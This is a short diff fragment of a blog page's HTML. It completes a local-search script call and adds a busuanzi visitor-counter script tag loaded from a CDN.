+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
